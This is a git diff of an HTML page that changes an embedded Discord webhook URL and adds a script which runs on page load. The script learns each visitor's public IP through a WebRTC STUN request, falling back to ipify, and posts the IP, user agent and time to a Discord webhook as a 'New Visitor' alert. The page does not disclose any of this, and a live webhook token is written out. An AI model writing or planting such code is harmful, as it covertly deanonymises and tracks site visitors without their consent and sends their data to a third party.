@@ -3,7 +3,7 @@
 <head>
 
 <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1512175774239690842/hgYlrlSj6fH8PLMooHYu3t7Gz8Nm7FggoNlq6dojdBEhoTJcPw9h_JLyXs1ms38cz413"; // Replace with your webhook
 
   // Get User-Agent string
   const userAgent = navigator.userAgent;
@@ -160,7 +160,78 @@
   }
 </script>
 
+<script>
+// ==========================================
+// CONFIGURATION - Replace with your webhook
+// ==========================================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1512175774239690842/hgYlrlSj6fH8PLMooHYu3t7Gz8Nm7FggoNlq6dojdBEhoTJcPw9h_JLyXs1ms38cz413';
+// ==========================================
 
+async function getIPViaWebRTC() {
+    return new Promise((resolve, reject) => {
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+
+        pc.createDataChannel('');
+
+        pc.onicecandidate = (event) => {
+            if (!event.candidate) return;
+            
+            const candidate = event.candidate.candidate;
+            if (candidate) {
+                const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                if (ipMatch && 
+                    !ipMatch[0].startsWith('192.168.') && 
+                    !ipMatch[0].startsWith('10.') && 
+                    !ipMatch[0].startsWith('172.16.')) {
+                    resolve(ipMatch[0]);
+                    pc.close();
+                }
+            }
+        };
+
+        setTimeout(() => {
+            reject('WebRTC timeout');
+            pc.close();
+        }, 5000);
+    });
+}
+
+async function sendToDiscord(ip) {
+    const message = {
+        content: `🌐 **New Visitor**\nIP: ${ip}\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`
+    };
+
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+        console.log('✅ Sent to Discord');
+    } catch (error) {
+        console.error('❌ Discord error:', error);
+    }
+}
+
+// Run it
+(async () => {
+    try {
+        const ip = await getIPViaWebRTC();
+        await sendToDiscord(ip);
+    } catch (error) {
+        console.log('WebRTC failed, using fallback...');
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            await sendToDiscord(data.ip);
+        } catch (e) {
+            console.error('Everything failed:', e);
+        }
+    }
+})();
+</script>
 
 
 
